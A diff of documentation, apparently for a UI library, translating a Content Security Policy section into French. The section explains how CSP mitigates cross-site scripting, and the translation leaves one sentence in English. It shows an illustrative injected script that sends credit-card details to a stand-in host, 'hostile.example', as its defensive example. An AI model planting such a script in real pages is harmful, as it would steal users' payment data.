@@ -276,9 +276,9 @@ const Button = withStyles(styles, { name: 'button' })(ButtonBase);
 
 ## Content Security Policy (CSP)
 
-### What is CSP and why is it useful?
+### Qu'est-ce que le CSP et en quoi est-ce utile ?
 
-Basically, CSP mitigates cross-site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from. This list is returned as a header from the server. For instance, say you have a site hosted at `https://example.com` the CSP header `default-src: 'self';` will allow all assets that are located at `https://example.com/*` and deny all others. If there is a section of your website that is vulnerable to XSS where unescaped user input is displayed, an attacker could input something like:
+Fondamentalement, CSP atténue les attaques XSS (Cross-Site Scripting) en obligeant les développeurs à ajouter aux listes blanches les sources de leurs ressources. Cette liste est renvoyée en tant qu'en-tête du serveur. Par exemple, disons que vous avez un site hébergé à ` https://example.com ` l'en-tête CSP ` default-src: 'self'; ` autorisera toutes les requêtes à destination de ` https://example.com/* ` et refusera tous les autres. If there is a section of your website that is vulnerable to XSS where unescaped user input is displayed, an attacker could input something like:
 
     <script>
       sendCreditCardDetails('https://hostile.example');
